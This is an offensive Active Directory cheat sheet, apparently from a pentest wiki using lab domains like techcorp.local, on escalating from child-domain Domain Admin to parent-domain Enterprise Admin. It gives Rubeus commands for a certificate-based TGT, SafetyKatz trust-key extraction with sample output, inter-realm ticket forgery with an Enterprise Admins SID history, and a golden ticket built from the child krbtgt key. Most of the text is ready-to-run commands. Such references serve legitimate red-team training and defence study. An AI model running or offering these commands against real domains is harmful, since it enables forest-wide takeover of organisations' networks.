# DA to EA

## Request other certificate

When you get DA to a domain via [#pkinit-authentication](../misc/ad-authentication.md#pkinit-authentication "mention"), for instance with [esc1.md](../adcs/exploitation/esc1.md "mention"), you can get Enterprise Admin of a parent domain via:

```powershell
> Rubeus asktgt /user:parentdomain.local\Administrator /dc:dc.parentdomain.local /certificate:<cert> /password:<pass> /nowrap /ptt
```

## Domain trust key

Get the trust key from the child domain to the parent domain with SafetyKatz on a DC:

```powershell
> SafetyKatz.exe "lsadump::evasive-trust /patch"
[In] us.techcorp.local -> techcorp.local
* hash
* aes256_hmac XXX
* aes128_hmac XXX
* rc4_hmac_nt XXX

[Out] techcorp.local -> us.techcorp.local
* hash
* aes256_hmac XXX
* aes128_hmac XXX
* rc4_hmac_nt XXX

...
```

It is also possible to retrieve the trust key through [dcsync.md](dcsync.md "mention") (cf. [#with-a-tgt](dcsync.md#with-a-tgt "mention")).

The trust key is of the form of an NT hash.

Next, forge a ticket whose SID History is of `Enterprise Admins` group. The SPN is for krbtgt:

```powershell
> Rubeus.exe evasive-silver /user:Administrator /ldap /service:krbtgt/US.TECHCORP.LOCAL /rc4:<trust key> /sids:<enterprise admins SID> /nowrap
```

Then, ask another service ticket for service HTTP using the previous ticket:

```powershell
> Rubeus.exe asktgs /service:http/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /ptt /ticket:<ticket>
```

We now have a service ticket to the parent DC with HTTP and Administrator privileges, we can for instance use WinRM to access the DC.

It is possible to specify another service name such as CIFS to access the server via SMB.

## Through krbtgt

As we compromised the krbtgt account of the child domain, it is possible to create a golden ticket that will be valid on the parent domain :

```powershell
> Rubeus.exe evasive-golden /user:Administrator /id:500 /domain:us.techcorp.local /sid:<child domain SID> /groups:513 /sids:<enterprise admin SID> /aes256:<krbtgt key> /ptt
```
